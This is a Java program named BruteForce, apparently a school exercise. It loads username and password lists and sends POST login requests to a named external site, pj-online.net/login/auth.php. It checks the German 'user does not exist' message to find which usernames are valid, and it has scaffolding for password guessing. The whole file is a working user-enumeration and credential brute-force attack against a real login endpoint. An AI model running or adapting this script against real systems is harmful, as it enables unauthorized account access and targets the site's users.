import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;

public class BruteForce {

    public static void main(String[] args) throws IOException {
        ArrayList<String> users = read("Schulaufgaben/Data/Bruteforce/usernames.txt");
        ArrayList<String> passwords = read("Schulaufgaben/Data/Bruteforce/passwords.txt");
        String Uri = "http://pj-online.net/login/auth.php";

        for (String user:users
             ) {
                ForceResponse response = bruteForce(Uri,user,"Test");
                if(response == ForceResponse.WRONGUSER){
                    System.out.println(user);
                }
        }
    }

    public static ForceResponse bruteForce(String uri,String username,String password) throws IOException {
        URL url = new URL(uri);
        String payload = "user="+username+"&password="+password;
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Length", Integer.toString(payload.length()));
        OutputStream os = conn.getOutputStream();
        os.write(payload.getBytes());
        os.flush();
        os.close();

        int responseCode = conn.getResponseCode();
        //System.out.println("POST Response Code :: " + responseCode);

        if (responseCode == HttpURLConnection.HTTP_OK) {
            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
                if(line.contains("Benutzer " + username + " gibt es nicht!")){
                    return ForceResponse.WRONGUSER;}
            }
            br.close();
        }
        return ForceResponse.UNKNOWN;
    }

    public static ArrayList<String> read(String filepath) throws IOException {
        ArrayList<String> list = new ArrayList<>();
        try(BufferedReader reader = new BufferedReader(new FileReader(filepath))){
            String line = reader.readLine();
            while (line != null){
                list.add(line);
                line = reader.readLine();
            }
        }
        return list;
    }
}


enum ForceResponse{
    WRONGUSER,WRONGPASSWORD,SUCCESS,UNKNOWN
}
